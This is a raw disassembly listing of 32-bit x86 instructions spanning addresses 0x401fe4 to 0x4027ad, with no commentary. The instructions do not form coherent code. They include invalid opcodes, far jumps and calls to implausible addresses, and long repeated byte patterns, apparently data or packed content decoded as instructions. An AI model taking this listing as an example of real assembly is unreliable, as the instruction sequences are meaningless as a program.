  401fe4:	bound  esp,QWORD PTR ds:0x25050043
  401fea:	inc    ecx
  401feb:	inc    ebx
  401fec:	inc    eax
  401fed:	test   BYTE PTR [eax+0x0],al
  401ff0:	bound  ebx,QWORD PTR [eax+0x62]
  401ff3:	inc    ecx
  401ff4:	inc    eax
  401ff5:	stos   BYTE PTR es:[di],al
  401ff7:	or     eax,0x40c16473
  401ffc:	pop    edx
  401ffd:	mov    bh,0x93
  401fff:	leave  
  402000:	or     al,0x4c
  402002:	push   esp
  402003:	inc    eax
  402004:	ret    0x9078
  402007:	pusha  
  402008:	bound  edi,QWORD PTR [eax+0x272c40cb]
  40200e:	in     eax,dx
  40200f:	or     BYTE PTR [ebx+0x4040b4cb],bh
  402015:	outs   dx,BYTE PTR ds:[esi]
  402016:	inc    esi
  402017:	retf   
  402018:	xchg   ebx,eax
  402019:	test   al,0xd
  40201b:	fcmovnb st,st(0)
  40201d:	jmp    0x10d16364
  402022:	inc    ebp
  402023:	cmc    
  402024:	xor    al,0x62
  402026:	mov    esp,0xf423a0a
  40202b:	adc    BYTE PTR [esi+0x27],0x69
  40202f:	adc    al,0x52
  402031:	adc    BYTE PTR [edx+0x40],ah
  402034:	inc    ecx
  402035:	and    eax,0x40000500
  40203a:	inc    ebx
  40203b:	add    eax,0x40624041
  402040:	inc    ebx
  402041:	add    eax,0x43402541
  402046:	bound  eax,QWORD PTR [eax+0x43]
  402049:	int3   
  40204a:	inc    eax
  40204b:	bound  eax,QWORD PTR [eax]
  40204d:	inc    ecx
  40204e:	inc    eax
  40204f:	inc    eax
  402050:	add    eax,0xe7484105
  402055:	ror    BYTE PTR [ebx+0x43],0x62
  402059:	xchg   ebp,eax
  40205a:	push   ecx
  40205b:	bound  eax,QWORD PTR [edi+0x7d]
  40205e:	gs dec eax
  402060:	xor    eax,0xcb603ca4
  402065:	inc    eax
  402066:	adc    BYTE PTR [eax-0x80],ch
  402069:	pop    edx
  40206a:	push   edx
  40206b:	sub    bh,BYTE PTR [esi]
  40206d:	shl    BYTE PTR [ebp-0x7e],0xc5
  402071:	int    0xf7
  402073:	cmp    DWORD PTR [ecx+0x15],ecx
  402076:	pop    edi
  402077:	sbb    eax,DWORD PTR [eax-0x35]
  40207a:	dec    edi
  40207b:	stos   DWORD PTR es:[edi],eax
  40207c:	jecxz  0x4020b1
  40207e:	das    
  40207f:	push   ds
  402080:	mov    bh,0x90
  402082:	bound  eax,QWORD PTR [eax+0x25]
  402085:	add    BYTE PTR [esi+0x40],ah
  402088:	add    eax,0x40404143
  40208d:	inc    ebx
  40208e:	add    BYTE PTR [eax],al
  402090:	add    BYTE PTR [edx-0x34],ah
  402093:	inc    eax
  402094:	add    eax,0x40004041
  402099:	inc    ecx
  40209a:	int3   
  40209b:	add    BYTE PTR [ebx-0x7c],al
  40209e:	add    eax,0x5406240
  4020a3:	bound  esp,QWORD PTR ds:0x271a7d40
  4020a9:	xchg   BYTE PTR [ecx-0x41],ch
  4020ac:	or     al,BYTE PTR [edx+0x48]
  4020af:	shl    BYTE PTR [ebp-0x35],0x5a
  4020b3:	inc    eax
  4020b4:	retf   
  4020b5:	pop    ebp
  4020b6:	sub    ch,BYTE PTR [esp+edx*1]
  4020b9:	xchg   edx,eax
  4020ba:	inc    eax
  4020bb:	inc    edx
  4020bc:	inc    eax
  4020bd:	bound  ebx,QWORD PTR [eax+0x41]
  4020c0:	add    eax,0x40404340
  4020c5:	inc    ebx
  4020c6:	inc    eax
  4020c7:	test   BYTE PTR [eax],al
  4020c9:	add    eax,0x40624041
  4020ce:	inc    eax
  4020cf:	add    BYTE PTR [edx+0x5],ah
  4020d2:	inc    ebx
  4020d3:	add    BYTE PTR [eax+0x78],al
  4020d6:	inc    ecx
  4020d7:	add    BYTE PTR [eax+0x41],bl
  4020da:	bound  edi,QWORD PTR [ecx]
  4020dc:	and    BYTE PTR [edi-0x4a8cdea2],bh
  4020e2:	inc    esp
  4020e3:	sub    BYTE PTR [edx],al
  4020e5:	arpl   ax,ax
  4020e7:	mov    edi,0x5228670e
  4020ec:	xchg   DWORD PTR [ebx+0x60],ebp
  4020ef:	adc    al,0x41
  4020f1:	sub    dl,BYTE PTR ds:0x6b7148d0
  4020f7:	bound  esi,QWORD PTR [esi]
  4020f9:	ja     0x4020df
  4020fb:	inc    esp
  4020fc:	adc    eax,0x4c30c032
  402101:	sar    DWORD PTR [ecx+0x39],1
  402104:	retf   
  402105:	xchg   esp,eax
  402106:	cs jp  0x40216d
  402109:	bound  esp,QWORD PTR [edx+0x24]
  40210c:	inc    edx
  40210d:	rcl    BYTE PTR [edi-0x5d],0x4
  402111:	or     bl,cl
  402113:	adc    edx,DWORD PTR [esi-0x33ff7bc0]
  402119:	bound  eax,QWORD PTR ds:0xcc840f41
  40211f:	inc    ebx
  402120:	add    BYTE PTR [eax+0x0],al
  402123:	inc    eax
  402124:	inc    eax
  402125:	inc    eax
  402126:	int3   
  402127:	add    BYTE PTR ds:0x62404341,al
  40212d:	pop    eax
  40212e:	add    BYTE PTR [ebx+0x40],al
  402131:	bound  ecx,QWORD PTR [edi]
  402133:	inc    eax
  402134:	repz shl BYTE PTR [edi+0x7b],0x18
  402139:	(bad)  
  40213a:	in     eax,0xe4
  40213c:	bound  edx,QWORD PTR ds:0xc1624721
  402142:	bound  esp,QWORD PTR [ebx+0xc]
  402145:	es jle 0x40217a
  402148:	popa   
  402149:	(bad)  
  40214a:	int    0x0
  40214c:	add    BYTE PTR [eax+0x40],al
  40214f:	cmovno eax,DWORD PTR ds:0x40056243
  402156:	int3   
  402157:	add    ah,cl
  402159:	inc    eax
  40215a:	inc    eax
  40215b:	bound  eax,QWORD PTR [ecx+0x0]
  40215e:	add    BYTE PTR [edi],cl
  402160:	inc    ebx
  402161:	inc    eax
  402162:	inc    eax
  402163:	add    BYTE PTR [ecx+0x43],al
  402166:	add    eax,0x40256240
  40216b:	bound  eax,QWORD PTR [eax]
  40216d:	pusha  
  40216e:	xchg   ebx,eax
  40216f:	inc    edx
  402170:	mov    ds:0x109b0048,eax
  402175:	fsub   st(0),st
  402177:	rcr    BYTE PTR [esi+0x37],0x62
  40217b:	mov    al,ds:0x7e225642
  402180:	mov    ch,0x50
  402182:	jnp    0x4021e7
  402184:	retf   
  402185:	xor    eax,0x644d5d68
  40218a:	test   DWORD PTR [eax+ebp*4-0x1f3f3370],esi
  402191:	adc    al,0x81
  402193:	and    al,BYTE PTR [edx+0x5]
  402196:	sti    
  402197:	add    eax,0x4140cc00
  40219c:	inc    eax
  40219d:	inc    ebx
  40219e:	bound  esp,QWORD PTR ds:0x41400043
  4021a4:	add    BYTE PTR [eax],al
  4021a6:	add    eax,0x43624062
  4021ab:	inc    ecx
  4021ac:	inc    eax
  4021ad:	inc    eax
  4021ae:	inc    eax
  4021af:	add    eax,0x40624340
  4021b4:	add    eax,0x40664140
  4021b9:	jl     0x4021ea
  4021bb:	jnp    0x402222
  4021bd:	inc    ecx
  4021be:	inc    esp
  4021bf:	jnp    0x402240
  4021c1:	inc    eax
  4021c2:	dec    BYTE PTR [esi-0x37]
  4021c5:	arpl   WORD PTR [eax],sp
  4021c7:	inc    esp
  4021c8:	mov    bh,0xc3
  4021ca:	or     al,0x32
  4021cc:	jmp    0x4021a2
  4021ce:	test   al,0x43
  4021d0:	(bad)  
  4021d1:	pop    ecx
  4021d2:	mov    ds:0xdf0f991,eax
  4021d7:	ins    BYTE PTR es:[edi],dx
  4021d8:	adc    eax,eax
  4021da:	xlat   BYTE PTR ds:[ebx]
  4021db:	inc    ebx
  4021dc:	rol    BYTE PTR [ecx-0x37],0x8c
  4021e0:	out    0x4a,al
  4021e2:	and    eax,0xb450a8a6
  4021e7:	arpl   WORD PTR [edx+0x16],sp
  4021ea:	push   0x41493bb7
  4021ef:	push   es
  4021f0:	push   ebx
  4021f1:	inc    eax
  4021f2:	and    al,0x43
  4021f4:	add    BYTE PTR ds:0x41107840,al
  4021fa:	bound  eax,QWORD PTR [eax+0x40]
  4021fd:	sldt   WORD PTR [eax-0x34]
  402201:	js     0x402265
  402203:	add    eax,0x40664143
  402208:	inc    ebx
  402209:	add    BYTE PTR [ecx+0x5],al
  40220c:	js     0x40224e
  40220e:	bound  eax,QWORD PTR [eax+0x0]
  402211:	inc    eax
  402212:	push   esp
  402213:	ss and al,0xd
  402216:	test   al,0xca
  402218:	dec    ebp
  402219:	add    al,0x64
  40221b:	adc    BYTE PTR [eax],bh
  40221d:	dec    eax
  40221e:	adc    cl,bh
  402220:	inc    eax
  402221:	pop    esp
  402222:	add    al,0x35
  402224:	aam    0x64
  402226:	retf   0x7e5a
  402229:	and    al,0xcb
  40222b:	xor    cl,0xc5
  40222e:	inc    esp
  40222f:	inc    ecx
  402230:	inc    ebx
  402231:	inc    eax
  402232:	inc    eax
  402233:	add    eax,0x434162
  402238:	inc    eax
  402239:	add    BYTE PTR [edx+0x5],ah
  40223c:	inc    eax
  40223d:	adc    BYTE PTR [edx+0x40],ah
  402240:	inc    ebx
  402241:	inc    ecx
  402242:	add    eax,0x4340
  402247:	add    eax,0x404162
  40224c:	add    BYTE PTR [eax+0x43],al
  40224f:	inc    eax
  402250:	add    eax,0x8834401f
  402255:	inc    eax
  402256:	push   ebx
  402257:	dec    edi
  402258:	retf   
  402259:	cmp    BYTE PTR [edx+0x69],ah
  40225c:	retf   
  40225d:	inc    eax
  40225e:	mov    eax,0x405db480
  402263:	mov    eax,ds:0xc50d6358
  402268:	adc    eax,0x64437bb0
  40226d:	inc    eax
  40226e:	add    BYTE PTR [eax],al
  402270:	inc    ecx
  402271:	inc    ebx
  402272:	add    eax,0x41784062
  402277:	inc    eax
  402278:	inc    eax
  402279:	add    BYTE PTR [edi],cl
  40227b:	bound  eax,QWORD PTR [ebx+0x0]
  40227e:	add    eax,0x25006240
  402283:	inc    eax
  402284:	add    eax,0x40254143
  402289:	add    eax,0x7d620000
  40228e:	retf   
  40228f:	inc    ecx
  402290:	retf   
  402291:	popa   
  402292:	inc    eax
  402293:	and    esp,DWORD PTR [edx+edx*4]
  402296:	enter  0xb841,0xf7
  40229a:	inc    ebx
  40229b:	stos   DWORD PTR es:[edi],eax
  40229c:	mov    bh,0xbf
  40229e:	out    dx,eax
  40229f:	dec    eax
  4022a0:	inc    edi
  4022a1:	cwde   
  4022a2:	inc    esi
  4022a3:	dec    eax
  4022a4:	mov    al,0x46
  4022a6:	and    BYTE PTR [ecx+0x1b],ch
  4022a9:	and    BYTE PTR [ecx],al
  4022ab:	loopne 0x402278
  4022ad:	adc    BYTE PTR [eax],ch
  4022af:	retf   
  4022b0:	int3   
  4022b1:	push   esi
  4022b2:	inc    eax
  4022b3:	or     DWORD PTR [ebx-0x1457edc0],esi
  4022b9:	dec    ecx
  4022ba:	add    cl,BYTE PTR [edi-0x49]
  4022bd:	bound  esp,QWORD PTR [esi]
  4022bf:	adc    al,bl
  4022c1:	mov    ch,0xd3
  4022c3:	inc    ebx
  4022c4:	add    BYTE PTR [eax],al
  4022c6:	add    BYTE PTR [ecx+0x40],al
  4022c9:	bound  esp,QWORD PTR [esi+0x0]
  4022cc:	inc    eax
  4022cd:	add    eax,0x5400000
  4022d2:	inc    ecx
  4022d3:	inc    eax
  4022d4:	inc    eax
  4022d5:	bound  esp,QWORD PTR ds:0x25050043
  4022db:	inc    ecx
  4022dc:	inc    ebx
  4022dd:	inc    eax
  4022de:	test   BYTE PTR [eax+0x0],al
  4022e1:	bound  ebx,QWORD PTR [eax+0x62]
  4022e4:	inc    ecx
  4022e5:	inc    eax
  4022e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022e7:	mov    ah,0xd0
  4022e9:	jg     0x402337
  4022eb:	dec    edi
  4022ec:	ret    
  4022ed:	inc    ecx
  4022ee:	outs   dx,DWORD PTR ds:[esi]
  4022ef:	xor    eax,0x9c415a49
  4022f4:	outs   dx,BYTE PTR ds:[esi]
  4022f5:	push   ecx
  4022f6:	loop   0x402281
  4022f8:	sub    ebp,edx
  4022fa:	inc    edi
  4022fb:	add    eax,0x4b3641f4
  402300:	sbb    bl,cl
  402302:	adc    al,0x7b
  402304:	adc    BYTE PTR [edx+0x40],ah
  402307:	inc    ecx
  402308:	and    eax,0x40000500
  40230d:	inc    ebx
  40230e:	add    eax,0x40624041
  402313:	inc    ebx
  402314:	add    eax,0x43402541
  402319:	bound  eax,QWORD PTR [eax+0x43]
  40231c:	int3   
  40231d:	inc    eax
  40231e:	bound  eax,QWORD PTR [eax]
  402320:	inc    ecx
  402321:	inc    eax
  402322:	inc    eax
  402323:	add    eax,0x427f0105
  402328:	cwde   
  402329:	dec    ebp
  40232a:	jne    0x40237e
  40232c:	mov    eax,0x91614207
  402331:	mov    eax,ds:0x2b051105
  402336:	and    edx,DWORD PTR [eax-0x56]
  402339:	inc    edx
  40233a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40233b:	mov    ah,0xcb
  40233d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40233e:	into   
  40233f:	popa   
  402340:	xchg   ecx,eax
  402341:	add    bl,dh
  402343:	push   0xffffffb8
  402345:	(bad)  
  402346:	or     ecx,DWORD PTR [ebx+ebx*4+0x69]
  40234a:	push   0xffffffc2
  40234c:	inc    edi
  40234d:	dec    eax
  40234e:	push   esp
  40234f:	and    dl,BYTE PTR [ecx+0x3464a862]
  402355:	push   esi
  402356:	jne    0x40234f
  402358:	test   eax,0xc86d6b70
  40235d:	pop    esp
  40235e:	shl    DWORD PTR [edx+0x40],cl
  402361:	and    eax,0x5406600
  402366:	inc    ebx
  402367:	inc    ecx
  402368:	inc    eax
  402369:	inc    eax
  40236a:	inc    ebx
  40236b:	add    BYTE PTR [eax],al
  40236d:	add    BYTE PTR [edx-0x34],ah
  402370:	inc    eax
  402371:	add    eax,0x40004041
  402376:	inc    ecx
  402377:	int3   
  402378:	add    BYTE PTR [ebx-0x7c],al
  40237b:	add    eax,0x5406240
  402380:	bound  ebp,QWORD PTR ds:0x70a3d091
  402386:	mov    eax,0x6441494e
  40238b:	mov    BYTE PTR [edx+0x62],dl
  40238e:	mov    DWORD PTR [edi+eiz*2+0x10984060],edx
  402395:	jmp    0x4023fc
  402397:	mov    ds:0x3f42234f,al
  40239c:	push   edx
  40239d:	cwde   
  40239e:	bound  eax,QWORD PTR [edx]
  4023a0:	cmp    edx,DWORD PTR [ebx+0x2c]
  4023a3:	stos   DWORD PTR es:[edi],eax
  4023a4:	push   edx
  4023a5:	cmovnp eax,DWORD PTR fs:[ecx+0x67]
  4023aa:	push   eax
  4023ab:	mov    ah,0x4
  4023ad:	or     ebx,DWORD PTR [eax]
  4023af:	adc    ecx,DWORD PTR [ecx+0x13]
  4023b2:	fs push ecx
  4023b4:	int    0x58
  4023b6:	arpl   bp,ax
  4023b8:	inc    eax
  4023b9:	loope  0x4023cf
  4023bb:	inc    eax
  4023bc:	bound  ebx,QWORD PTR [eax+0x41]
  4023bf:	add    eax,0x40404340
  4023c4:	inc    ebx
  4023c5:	inc    eax
  4023c6:	test   BYTE PTR [eax],al
  4023c8:	add    eax,0x40624041
  4023cd:	inc    eax
  4023ce:	add    BYTE PTR [edx+0x5],ah
  4023d1:	inc    ebx
  4023d2:	add    BYTE PTR [eax+0x78],al
  4023d5:	inc    ecx
  4023d6:	add    BYTE PTR [eax+0x41],bl
  4023d9:	bound  esp,QWORD PTR [edi]
  4023db:	mov    esp,0x2f8a4965
  4023e0:	pusha  
  4023e1:	retf   
  4023e2:	push   ecx
  4023e3:	adc    eax,0x4ba3d828
  4023e8:	and    edx,DWORD PTR [esp+ebx*4-0x35]
  4023ec:	les    eax,FWORD PTR [ebx-0x59]
  4023ef:	inc    eax
  4023f0:	dec    esi
  4023f1:	fs jg  0x402401
  4023f4:	mov    eax,ds:0xcc008440
  4023f9:	bound  eax,QWORD PTR ds:0xcc840f41
  4023ff:	inc    ebx
  402400:	add    BYTE PTR [eax+0x0],al
  402403:	inc    eax
  402404:	inc    eax
  402405:	inc    eax
  402406:	int3   
  402407:	add    BYTE PTR ds:0x62404341,al
  40240d:	pop    eax
  40240e:	add    BYTE PTR [ebx+0x40],al
  402411:	bound  ecx,QWORD PTR [edi]
  402413:	inc    eax
  402414:	vpunpcklwd ymm3,ymm0,YMMWORD PTR [si]
  402419:	inc    esp
  40241a:	xor    eax,0x7adbcdb2
  40241f:	dec    ebp
  402420:	retf   
  402421:	gs inc eax
  402423:	cmp    ebx,DWORD PTR [esi+0x40]
  402426:	dec    ebp
  402427:	mov    ds:0x2e484c88,al
  40242c:	xor    al,0x60
  40242e:	inc    eax
  40242f:	pop    ds
  402430:	add    BYTE PTR [eax],al
  402432:	inc    eax
  402433:	inc    eax
  402434:	cmovno eax,DWORD PTR ds:0x40056243
  40243b:	int3   
  40243c:	add    ah,cl
  40243e:	inc    eax
  40243f:	inc    eax
  402440:	bound  eax,QWORD PTR [ecx+0x0]
  402443:	add    BYTE PTR [edi],cl
  402445:	inc    ebx
  402446:	inc    eax
  402447:	inc    eax
  402448:	add    BYTE PTR [ecx+0x43],al
  40244b:	add    eax,0x40256240
  402450:	bound  eax,QWORD PTR [eax]
  402452:	retf   
  402453:	push   ecx
  402454:	inc    eax
  402455:	arpl   WORD PTR [ebx],di
  402457:	inc    eax
  402458:	sub    al,0x26
  40245a:	add    ebp,ebx
  40245c:	xor    al,0x92
  40245e:	push   ds
  40245f:	inc    eax
  402460:	inc    eax
  402461:	sub    ch,BYTE PTR [ebx+0x5e34fd63]
  402467:	inc    eax
  402468:	cmp    DWORD PTR ds:0x4140cc00,eax
  40246e:	inc    eax
  40246f:	inc    ebx
  402470:	bound  esp,QWORD PTR ds:0x41400043
  402476:	add    BYTE PTR [eax],al
  402478:	add    eax,0x43624062
  40247d:	inc    ecx
  40247e:	inc    eax
  40247f:	inc    eax
  402480:	inc    eax
  402481:	add    eax,0x40624340
  402486:	add    eax,0x40664140
  40248b:	jecxz  0x402420
  40248d:	mov    bl,al
  40248f:	lds    edx,FWORD PTR [esi-0x34d9d8b0]
  402495:	daa    
  402496:	sti    
  402497:	dec    edi
  402498:	add    DWORD PTR [eax+0x40],eax
  40249b:	loope  0x40244e
  40249d:	cmp    BYTE PTR [esi+0x3340cb80],bh
  4024a3:	sbb    esi,DWORD PTR [edi+0x40405a91]
  4024a9:	inc    eax
  4024aa:	inc    eax
  4024ab:	addr16 dec esp
  4024ad:	cmp    al,ch
  4024af:	inc    eax
  4024b0:	mov    ds:0x644b0450,al
  4024b5:	and    eax,0x408163c9
  4024ba:	ins    DWORD PTR es:[edi],dx
  4024bb:	and    DWORD PTR [eax+ecx*2],eax
  4024be:	xchg   ecx,eax
  4024bf:	jge    0x402503
  4024c1:	inc    eax
  4024c2:	inc    ebp
  4024c3:	imul   ecx,ebx,0x8744bfc8
  4024c9:	inc    ebx
  4024ca:	add    BYTE PTR ds:0x41107840,al
  4024d0:	bound  eax,QWORD PTR [eax+0x40]
  4024d3:	sldt   WORD PTR [eax-0x34]
  4024d7:	js     0x40253b
  4024d9:	add    eax,0x40664143
  4024de:	inc    ebx
  4024df:	add    BYTE PTR [ecx+0x5],al
  4024e2:	js     0x402524
  4024e4:	bound  eax,QWORD PTR [eax+0x0]
  4024e7:	inc    eax
  4024e8:	inc    eax
  4024e9:	inc    eax
  4024ea:	jecxz  0x402484
  4024ec:	inc    ebx
  4024ed:	inc    ecx
  4024ee:	push   esp
  4024ef:	call   0xcb554a04
  4024f4:	imul   edi,DWORD PTR ss:[ebx+eiz*2+0x40],0xe3b1615b
  4024fd:	sub    al,0x68
  4024ff:	pusha  
  402500:	inc    eax
  402501:	inc    eax
  402502:	imul   esi,DWORD PTR [edi-0x2b2837a7],0x92223240
  40250c:	lea    eax,[ebx-0x72]
  40250f:	retf   
  402510:	adc    BYTE PTR [ecx+0x3f],bh
  402513:	jae    0x402544
  402515:	cmp    eax,0x40402ca8
  40251a:	aaa    
  40251b:	push   eax
  40251c:	adc    al,0x82
  40251e:	ins    DWORD PTR es:[edi],dx
  40251f:	pop    esp
  402520:	inc    eax
  402521:	and    ah,BYTE PTR [eax+0x64]
  402524:	gs test al,0x41
  402527:	inc    ebx
  402528:	inc    eax
  402529:	inc    eax
  40252a:	add    eax,0x434162
  40252f:	inc    eax
  402530:	add    BYTE PTR [edx+0x5],ah
  402533:	inc    eax
  402534:	adc    BYTE PTR [edx+0x40],ah
  402537:	inc    ebx
  402538:	inc    ecx
  402539:	add    eax,0x4340
  40253e:	add    eax,0x404162
  402543:	add    BYTE PTR [eax+0x43],al
  402546:	inc    eax
  402547:	add    eax,0x3f412897
  40254c:	loope  0x402552
  40254e:	pop    edx
  40254f:	adc    BYTE PTR [edx+0x12],ah
  402552:	ror    BYTE PTR [ebp+edx*2-0x35],1
  402556:	xor    eax,0x40b4418c
  40255b:	adc    eax,0x50f54e3
  402560:	pop    ss
  402561:	adc    eax,0x644e2740
  402566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402567:	retf   
  402568:	leave  
  402569:	int    0x40
  40256b:	xchg   BYTE PTR [ebp-0x42bc9df4],ch
  402571:	inc    eax
  402572:	add    BYTE PTR [eax],al
  402574:	inc    ecx
  402575:	inc    ebx
  402576:	add    eax,0x41784062
  40257b:	inc    eax
  40257c:	inc    eax
  40257d:	add    BYTE PTR [edi],cl
  40257f:	bound  eax,QWORD PTR [ebx+0x0]
  402582:	add    eax,0x25006240
  402587:	inc    eax
  402588:	add    eax,0x40254143
  40258d:	add    eax,0x11620000
  402592:	inc    eax
  402593:	inc    ecx
  402594:	add    eax,0x204d26cb
  402599:	pushf  
  40259a:	inc    eax
  40259b:	inc    edx
  40259c:	in     eax,dx
  40259d:	pop    eax
  40259e:	ror    BYTE PTR [esp+0x5440d10d],0x35
  4025a6:	bound  edx,QWORD PTR [ecx]
  4025a8:	test   ch,cl
  4025aa:	inc    ebx
  4025ab:	add    BYTE PTR [eax],al
  4025ad:	add    BYTE PTR [ecx+0x40],al
  4025b0:	bound  esp,QWORD PTR [esi+0x0]
  4025b3:	inc    eax
  4025b4:	add    eax,0x5400000
  4025b9:	inc    ecx
  4025ba:	inc    eax
  4025bb:	inc    eax
  4025bc:	bound  esp,QWORD PTR ds:0x25050043
  4025c2:	inc    ecx
  4025c3:	inc    ebx
  4025c4:	inc    eax
  4025c5:	test   BYTE PTR [eax+0x0],al
  4025c8:	bound  ebx,QWORD PTR [eax+0x62]
  4025cb:	inc    ecx
  4025cc:	inc    eax
  4025cd:	inc    eax
  4025ce:	and    al,0x23
  4025d0:	add    BYTE PTR [esi+0x42],0xc0
  4025d4:	inc    eax
  4025d5:	inc    eax
  4025d6:	push   cs
  4025d7:	aas    
  4025d8:	dec    ebx
  4025d9:	shl    BYTE PTR [ecx],0x10
  4025dc:	dec    eax
  4025dd:	inc    eax
  4025de:	inc    eax
  4025df:	lods   eax,DWORD PTR ds:[esi]
  4025e0:	pop    eax
  4025e1:	or     ebp,0x303fc752
  4025e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025e8:	fs test al,0xcd
  4025eb:	(bad)  
  4025ec:	call   0x4443431
  4025f1:	adc    DWORD PTR [eax+0x4f],ebx
  4025f4:	bound  eax,QWORD PTR [eax+0x41]
  4025f7:	aas    
  4025f8:	retf   
  4025f9:	push   ebx
  4025fa:	sub    al,BYTE PTR [ebx+0x50]
  4025fd:	inc    eax
  4025fe:	inc    esi
  4025ff:	aaa    
  402600:	push   ss
  402601:	cmp    eax,DWORD PTR [ecx+0x3e]
  402604:	fdivr  QWORD PTR [eax+edx*1]
  402607:	bound  eax,QWORD PTR [eax+0x41]
  40260a:	and    eax,0x40000500
  40260f:	inc    ebx
  402610:	add    eax,0x40624041
  402615:	inc    ebx
  402616:	add    eax,0x43402541
  40261b:	bound  eax,QWORD PTR [eax+0x43]
  40261e:	int3   
  40261f:	inc    eax
  402620:	bound  eax,QWORD PTR [eax]
  402622:	inc    ecx
  402623:	inc    eax
  402624:	inc    eax
  402625:	add    eax,0x13e14605
  40262a:	dec    ebp
  40262b:	sub    bl,bh
  40262d:	addr16 inc eax
  40262f:	sub    edx,DWORD PTR [ebx-0x2b6f34a6]
  402635:	jo     0x402677
  402637:	je     0x402601
  402639:	inc    eax
  40263a:	adc    BYTE PTR [edi+0x4040fb65],bh
  402640:	add    al,0x40
  402642:	lods   al,BYTE PTR ds:[esi]
  402643:	ins    BYTE PTR es:[edi],dx
  402644:	dec    esp
  402645:	imul   DWORD PTR [esi]
  402647:	push   es
  402648:	add    DWORD PTR [eax+0x41],edx
  40264b:	add    BYTE PTR ds:0x7f404009,al
  402651:	push   0x8cc94764
  402656:	inc    eax
  402657:	arpl   WORD PTR [ebx],ax
  402659:	dec    eax
  40265a:	and    al,0x42
  40265c:	dec    esp
  40265d:	add    eax,0xd4590640
  402662:	inc    esp
  402663:	bound  eax,QWORD PTR [eax+0x25]
  402666:	add    BYTE PTR [esi+0x40],ah
  402669:	add    eax,0x40404143
  40266e:	inc    ebx
  40266f:	add    BYTE PTR [eax],al
  402671:	add    BYTE PTR [edx-0x34],ah
  402674:	inc    eax
  402675:	add    eax,0x40004041
  40267a:	inc    ecx
  40267b:	int3   
  40267c:	add    BYTE PTR [ebx-0x7c],al
  40267f:	add    eax,0x5406240
  402684:	bound  esi,QWORD PTR [eax]
  402686:	inc    ecx
  402687:	xchg   DWORD PTR [eax+eax*2],eax
  40268a:	add    eax,DWORD PTR [ebx+0x2326a22a]
  402690:	inc    eax
  402691:	and    al,0x5f
  402693:	and    BYTE PTR [esi-0x58],0xcc
  402697:	sub    BYTE PTR [eax-0x3e],al
  40269a:	add    bl,cl
  40269c:	mov    ss,WORD PTR [edx]
  40269e:	arpl   WORD PTR [esi+0x40],cx
  4026a1:	inc    eax
  4026a2:	sub    DWORD PTR [edi+0x62],ebx
  4026a5:	mov    edi,0x4540755f
  4026aa:	cs mov edx,0x90a8bf7c
  4026b0:	xlat   BYTE PTR ds:[ebx]
  4026b1:	xor    eax,0x40b8814c
  4026b6:	bound  ebx,QWORD PTR [eax+0x41]
  4026b9:	add    eax,0x40404340
  4026be:	inc    ebx
  4026bf:	inc    eax
  4026c0:	test   BYTE PTR [eax],al
  4026c2:	add    eax,0x40624041
  4026c7:	inc    eax
  4026c8:	add    BYTE PTR [edx+0x5],ah
  4026cb:	inc    ebx
  4026cc:	add    BYTE PTR [eax+0x78],al
  4026cf:	inc    ecx
  4026d0:	add    BYTE PTR [eax+0x41],bl
  4026d3:	bound  edi,QWORD PTR [esi+0x2ea24940]
  4026d9:	add    BYTE PTR [ebx-0x35d56b9e],al
  4026df:	out    0x40,eax
  4026e1:	xor    BYTE PTR [eax-0x3fbebbd1],bh
  4026e7:	xor    eax,0x3045e032
  4026ec:	dec    ecx
  4026ed:	cmp    al,0x12
  4026ef:	sub    eax,0xb844873a
  4026f4:	cmp    al,0x24
  4026f6:	lds    ecx,FWORD PTR [esi+0x5204e40]
  4026fc:	pop    eax
  4026fd:	dec    eax
  4026fe:	dec    edi
  4026ff:	sub    DWORD PTR [ebx],0x68875f80
  402705:	sub    cl,BYTE PTR [edi+0x77]
  402708:	inc    eax
  402709:	sub    DWORD PTR [eax-0x7c],eax
  40270c:	add    ah,cl
  40270e:	bound  eax,QWORD PTR ds:0xcc840f41
  402714:	inc    ebx
  402715:	add    BYTE PTR [eax+0x0],al
  402718:	inc    eax
  402719:	inc    eax
  40271a:	inc    eax
  40271b:	int3   
  40271c:	add    BYTE PTR ds:0x62404341,al
  402722:	pop    eax
  402723:	add    BYTE PTR [ebx+0x40],al
  402726:	bound  ecx,QWORD PTR [edi]
  402728:	inc    eax
  402729:	mov    edx,0x3f5a5117
  40272e:	push   edx
  40272f:	and    edi,DWORD PTR [eax]
  402731:	sub    DWORD PTR [edi],0xd4073552
  402737:	add    BYTE PTR ss:[edx+0x48417562],0x64
  40273f:	inc    eax
  402740:	xor    eax,0x503005cb
  402745:	bound  ebp,QWORD PTR [edx]
  402747:	adc    DWORD PTR [edi-0x7d],eax
  40274a:	int    0x11
  40274c:	and    al,0xa9
  40274e:	xchg   esi,eax
  40274f:	and    al,BYTE PTR [edx+0x97ba]
  402755:	inc    eax
  402756:	inc    eax
  402757:	cmovno eax,DWORD PTR ds:0x40056243
  40275e:	int3   
  40275f:	add    ah,cl
  402761:	inc    eax
  402762:	inc    eax
  402763:	bound  eax,QWORD PTR [ecx+0x0]
  402766:	add    BYTE PTR [edi],cl
  402768:	inc    ebx
  402769:	inc    eax
  40276a:	inc    eax
  40276b:	add    BYTE PTR [ecx+0x43],al
  40276e:	add    eax,0x40256240
  402773:	bound  eax,QWORD PTR [eax]
  402775:	mov    bh,0xbb
  402777:	dec    esp
  402778:	fnstenv [edx-0xb]
  40277b:	xchg   ebx,eax
  40277c:	dec    edx
  40277d:	inc    ecx
  40277e:	cwde   
  40277f:	lods   eax,DWORD PTR ds:[esi]
  402780:	outs   dx,DWORD PTR ds:[esi]
  402781:	inc    edi
  402782:	ins    DWORD PTR es:[edi],dx
  402783:	nop
  402784:	fs into 
  402786:	cmp    DWORD PTR [edi],ecx
  402788:	ret    
  402789:	outs   dx,BYTE PTR ds:[esi]
  40278a:	call   0x2bb4:0xe86948ed
  402791:	inc    eax
  402792:	xchg   ecx,eax
  402793:	inc    edi
  402794:	and    al,0x94
  402796:	push   edx
  402797:	bound  edi,QWORD PTR [edi]
  402799:	js     0x40275e
  40279b:	inc    ebx
  40279c:	push   ebp
  40279d:	nop
  40279e:	test   eax,0x821c6900
  4027a3:	cld    
  4027a4:	mov    dl,0x62
  4027a6:	mov    al,0x87
  4027a8:	add    eax,0x4140cc00
  4027ad:	inc    eax
